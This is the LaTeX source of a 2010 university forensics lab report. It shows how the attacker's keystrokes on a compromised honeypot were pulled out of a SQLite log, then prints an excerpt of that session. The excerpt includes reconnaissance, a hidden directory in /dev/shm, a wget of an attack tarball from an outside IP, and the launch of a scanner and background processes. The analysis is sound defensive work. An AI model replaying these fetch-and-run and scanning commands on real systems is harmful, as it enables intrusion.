@@ -1,0 +1,316 @@
+% !TEX TS-program = pdflatex
+% !TEX encoding = UTF-8 Unicode
+
+\documentclass[a4paper,
+    11pt,
+    normalheadings,
+%   parskip,
+    parindent,
+%   draft,
+%   final,
+%   bibgerm,
+%   german,
+    UKenglish,
+%   twoside,
+%   twocolum,
+%   openright,  % Kap.beginn immer rechts! (fkt. nur bei report, nicht bei article)
+    abstracton,
+    ]{scrartcl}
+\usepackage[english]{babel}
+\usepackage[utf8]{inputenc} % set input encoding (not needed with XeLaTeX)
+
+%%% Examples of Article customizations
+% These packages are optional, depending whether you want the features they provide.
+% See the LaTeX Companion or other references for full information.
+
+%%% PAGE DIMENSIONS
+\usepackage{geometry} % to change the page dimensions
+\geometry{a4paper} % or letterpaper (US) or a5paper or....
+% \geometry{margins=2in} % for example, change the margins to 2 inches all round
+% \geometry{landscape} % set up the page for landscape
+%   read geometry.pdf for detailed page layout information
+
+\usepackage{graphicx} % support the \includegraphics command and options
+
+\usepackage[parfill]{parskip} % Activate to begin paragraphs with an empty line rather than an indent
+
+%%% PACKAGES
+\usepackage{booktabs} % for much better looking tables
+\usepackage{alltt} % provides alltt enviroment which allows \emph{}ed text
+\usepackage{array} % for better arrays (eg matrices) in maths
+\usepackage{paralist} % very flexible & customisable lists (eg. enumerate/itemize, etc.)
+\usepackage{verbatim} % adds environment for commenting out blocks of text & for better verbatim
+\usepackage{subfig} % make it possible to include more than one captioned figure/table in a single float
+% These packages are all incorporated in the memoir class to one degree or another...
+
+
+\usepackage[colorlinks,urlcolor=blue,plainpages=false]{hyperref}
+\usepackage{embedfile}        % Provides \embedfile[filename=foo, desc={bar}]{file}
+\usepackage{hyperxmp}         % To be have an XMP Data Stream f.e. to include the license
+
+% \usepackage{newcent}  % Different Font, looks bigger
+
+\usepackage{ifthen}
+
+\usepackage[
+    T1, % this is good for Umlauts
+%   OT1 % This breaks Umlauts
+       ]{fontenc}
+
+%%% HEADERS & FOOTERS
+\usepackage{fancyhdr} % This should be set AFTER setting up the page geometry
+\pagestyle{fancy} % options: empty , plain , fancy
+\renewcommand{\headrulewidth}{0pt} % customise the layout...
+\lhead{}\chead{}\rhead{}
+\lfoot{}\cfoot{\thepage}\rfoot{}
+
+%%% SECTION TITLE APPEARANCE
+\usepackage{sectsty}
+\allsectionsfont{\sffamily\mdseries\upshape} % (See the fntguide.pdf for font help)
+% (This matches ConTeXt defaults)
+
+%%% ToC (table of contents) APPEARANCE
+\usepackage[nottoc,notlof,notlot]{tocbibind} % Put the bibliography in the ToC
+\usepackage[titles,subfigure]{tocloft} % Alter the style of the Table of Contents
+\renewcommand{\cftsecfont}{\rmfamily\mdseries\upshape}
+\renewcommand{\cftsecpagefont}{\rmfamily\mdseries\upshape} % No bold!
+
+\usepackage{listings}
+
+%%% END Article customizations
+
+%%% The "real" document content comes below...
+
+% Title Page
+\newcommand{\mytitle}{Lab07: A Preliminary Report On Visualising Binary Data}
+\subject{Preliminary Report\\%
+    Forensics\\%
+    Summersemester 2010\\%
+    CA643\\%
+    Charlie Daly}
+\title{\mytitle{}}
+%\subtitle{}
+\author{
+    cand. Dipl. Inf. Tobias Müller <\href{mailto:muellet2@computing.dcu.ie?subject=ss10-forensic-lab01}{muellet2@}>, 59212333 \and
+    BSc. Anthony Walters <\href{mailto:waltera3@computing.dcu.ie?subject=ss10-forensic-lab01}{waltera3@}>, 59213102 \and Conor Lynch <\href{mailto:conor.lynch36@mail.dcu.ie}{lynchc36@}>, 55619599}
+% \institute[Mathe - UniHH]{Fachbereich Mathematik\\
+%         Universit\"at Hamburg}
+% \logo{\includegraphics[height=0.5cm]{cinsects-blue}}
+% \titlegraphic{\includegraphics[width=1.5cm]{fsr-logo}}
+\date{\today}
+
+
+\hypersetup{
+        pdftitle={\mytitle{}},
+        pdfauthor={Tobias Mueller, Anthony Walters, Conor Lynch},
+        pdfsubject={Forensics},
+        pdfkeywords={uni, linux, windows, ca643, forensics, binary, data, vis},
+        pdflang=en,
+        pdfcopyright={This work is licensed to the public under the Creative Commons Attribution-Non-Commercial-Share Alike 3.0 Germany License.},
+        pdflicenseurl={http://creativecommons.org/licenses/by-nc-sa/3.0/de/}
+}
+
+\hyphenation{Infor-mations-sys-teme}
+\hyphenation{\"{o}ko-logischen}
+
+\newcommand{\note}[1]{#1}
+\renewcommand{\comment}[1]{}
+\newcommand{\inlinequote}[1]{``\textit{#1}''}
+\newcommand{\FIXME}[1]{\mbox{}\marginpar{\footnotesize\raggedright\hspace{0pt}\color{red}\emph{#1}}}
+
+\begin{document}
+\selectlanguage{english}
+\maketitle
+
+
+\section{Introduction}
+In this Lab report, we will examine recorded traffic and console in- and output of a honeypot that has been ``hacked''.
+The network traffic was recorded into a file in the well known pcap (\emph{p}acket \emph{cap}ture) format\footnote{\url{http://www.tcpdump.org/pcap3_man.html}}.
+
+Using Wireshark on the pcap file, we can see, by selecting Statistics$\rightarrow$Summary,that the capture file identifies itself as being taken at 2009-01-14 16:24:07 and the capture lasts 11.5 days until 2009-01-26 10:05:01.
+In total, 4323191 IP packets, which sum up to 673023355 bytes,   were sent.
+% A breakdown can be found the protocol hierarchy in figure \FIXME{protcol hierarchy}
+
+In the rest of this preliminary report, we will show how to obtain the commands the attacker issued and present an excerpt.
+In the final report, we will analyse these commands and relate them with the traffic that was produced.
+But as this is only the preliminary version, we will not do any analysis.
+
+\section{Keyboard Capture File Examination}
+
+The commands executed on the machine can be found in the given \texttt{serial.db} file.
+This file can be parsed with a program such as SQLite\footnote{\url{http://sqlite.org/}}.
+
+First we used the \texttt{.schema} SQL command on the file to get an idea of how the database was structured.
+This told us that the database contains a single table called \texttt{spty}, which contains the fields, \texttt{id, msgtype, ptsname, cnt, msg} and \texttt{ts}.
+Some of these can be easily explained, for example \texttt{id} is the id number of the entry and \texttt{ts} represents the date.
+Some of the other fields would require further exploration.
+
+Using the following SQL command we were able to extract the contents of the database to a text file to more easily understand the purpose of each field.
+
+\begin{verbatim}
+./sqlite3-3.6.23.bin serial.db "SELECT * FROM spty;" > output.txt
+\end{verbatim}
+
+The message field seemed to contain text that would normally be displayed in a terminal.
+msgtype also seemed to be an interesting value.
+It seemed to be an integer value of either 1, 2 or 3, but was appeared to be set to 2 whenever the message field was not blank.
+
+To confirm this theory, we ran the following SQL queries:
+\begin{verbatim}
+SELECT * FROM spty where msgtype = 1 AND msg != '';
+SELECT * FROM spty where msgtype = 2 AND msg != '';
+SELECT * FROM spty where msgtype = 3 AND msg != '';
+\end{verbatim}
+
+As expected, only the second SQL command returned any data.
+We then passed this data out to a text file and set about trying to tidy up its formatting.
+
+We reasoned that lines concerning user input would contain the \texttt{\$} character (as this appears at the end of the command prompt in the shell).
+We eliminated all unrelated lines by carrying out the following sed command on the file:
+\begin{verbatim}
+sed -n '/\$/,/\r/p' output.txt
+\end{verbatim}
+
+This left us with a list of user inputs, however each typed character appeared on a separate line.
+Analysing the file with \texttt{xxd}, we noticed that \texttt{\textbackslash{}n} characters were used to separate typed characters whereas line breaks which we did not want to remove tended to use the \texttt{\textbackslash{}n\textbackslash{}r} character.
+Taking advantage of this, we removed the \texttt{\textbackslash{}n}s with the following command:
+\begin{verbatim}
+ awk '{printf("%s",$0)}' output.txt
+ \end{verbatim}
+
+ The output of this still contained the shell prompt, so we removed it with the following perl script:
+% FIXME: Well, we could use lstlisting for that. But I'm too lazy atm
+% But we shoul consider that for the final report
+ \begin{verbatim}
+ #!/usr/local/bin/perl
+
+open(INPUTFILE, "<output.txt");
+while(<INPUTFILE>)
+{
+        $line = $_;
+        chomp($line);
+        @words = split('\r',$line);
+        foreach $word(@words)
+        {
+                ($start, $end) = split('\$ ',$word);
+                print"$end\n";
+        }
+}
+\end{verbatim}
+
+This gives us the cleaned up output, some examples of which are shown below.
+These contain some unusual characters such as \texttt{[K}, where the person using the terminal hit a function key such as backspace or one of the arrow keys.
+
+
+
+\section{Sample Output}
+The output of the process above produced a very long list of commands. The first section of this output is printed below:
+
+\begin{verbatim}
+exit
+"  [Kecho nana
+w
+.quit  [K  [K  [K  [K  [K "  [K exit
+exit
+Linux jubrowska 2.6.28-rc6 #1 Thu Jan 8 15:44:07 CET 2009 i686
+"  [Kexit
+Linux jubrowska 2.6.28-rc6 #1 Thu Jan 8 15:44:07 CET 2009 i686
+wget http://www.xxx.com/
+more index.html
+exit
+wget 212.169.101.12  [K  [K4:/  [K  [K/                [Ch212.169.101.4/              t212.169.101.4/              t212.169.101.4/              p212.169.101.4/              :212.169.101.4/              /212.169.101.4/              /212.169.101.4/               [C [C [C [C [C [C [C [C [C [C [C [C [C [C  test-data/32MB
+wget http://212.169.101.4/test-data/32MB                           [C  [1P.169.101.4/test-data/32MB                         3.169.101.4/test-data/32MB
+
+"    [K  [Khttp://             [C [1@"  [1P [1P  [1P [1@h [C [C [C [C [C [C [C [C  [K  [Kwww.kernel.org/pub/linux/kenr  [K  [Krnel/v2.6/linux-2.6.28.tar.b  [Kgz
+http://www.kernel.org/pub/linux/kernel/v2.6/linux-2.6.28.tar.gz
+
+xitexit
+ext  [Kit
+Linux jubrowska 2.6.28-rc6 #1 Thu Jan 8 15:44:07 CET 2009 i686
+Linux jubrowska 2.6.28-rc6 #1 Thu Jan 8 15:44:07 CET 2009 i686
+w
+id
+cat /proc/cpuinfo
+adduser
+ls
+df -h
+c   ls
+cd
+ls
+mkdir " "
+cd /dev/shm
+mkdir " "
+cd " "
+ls
+pdw      wd
+ls
+wget http://download.microsoft.com/download/win2000platform/SP/SP3/NT5/EN-US/W2Ksp3.exe
+ls
+rm -rf W2Ksp3.exe
+wget http://83.12.218.22/~test/delles.tar.gz
+tar delles.tar.gz
+^[[A^[[D                        tar xzvf delles.tar.gz
+cd delles
+ls
+chmod +x *
+i   uptime
+w
+./ss 22 -a ip -s 10^[[D^[[D^[[D^[[D                                                                        20   07      11 -s 10
+./start 202 >> /dev/null &^[[D^[[D^[[D^[[D                                                   ^[[D^[[D                                                                           81   0 Corle                >> /dev/null &^[[D
+^[[A            ^[[A^[[A^[[A                                    nohup ./start 80 >> /dev/null &
+ps x
+nohupnohup ./start 81 >> /dev/null &
+nohup ./start 81 >> /dev/null &
+nohup ./start 82 >> /dev/null &
+nohup ./start 83 >> /dev/null &
+nohup ./start 84 >> /dev/null &
+nohup ./start 85 >> /dev/null &
+nohup ./start 86 >> /dev/null &
+nohup ./start 87 >> /dev/null &
+nohup ./start 88 >> /dev/null &
+nohup ./start 89 >> /dev/null &
+nohup ./start 90 >> /dev/null &
+ps x
+pwd
+Linux jubrowska 2.6.28-rc6 #1 Thu Jan 8 15:44:07 CET 2009 i686
+exit
+exit
+sudo bash
+top
+\end{verbatim}
+
+
+
+
+\section{Conclusion}
+
+We used wireshark to determine the start and end time of the complete packet capture.
+We then used a combination of \texttt{sed}, \texttt{awk} and \texttt{perl} to extract the commands issued by the attacker from the SQLite database file.
+Commands, that the attacker ran, were found and an excerpt was shown.
+
+%\appendix
+%\pagebreak
+% \nocite{*}
+% \bibliographystyle{geralpha}
+% \bibliographystyle{apasoft}
+% \bibliographystyle{cell}
+%\bibliographystyle{apalike}
+% Well, you the forensics.bib. Either just create an en empty one or clone the Mercurial repository:
+% hg clone https://hg.cryptobitch.de/ss10-ca643-forensic
+% and work insides the Labs directory.
+% If you have changes, first pull latest changes to make sure your changes apply cleanly to the most recent version:
+% hg pull && hg merge
+% If there are conflicts, you might want to have kdiff3 or meld installed.
+% After having merged changes (check with hg heads), do a
+% hg bundle /tmp/mychanges.bundle
+% and send me the bundle file.
+% To create changes, simple edit the file in question, save, and do a "hg ci".
+%\bibliography{forensics}
+
+\section*{License}
+This work is licensed to the public under the Creative Commons Attribution-Non-Commercial-Share Alike 3.0 Germany License.
+\begin{center}\includegraphics{bin/by-nc-sa-eu.png}\end{center}
+
+
+\end{document}
+
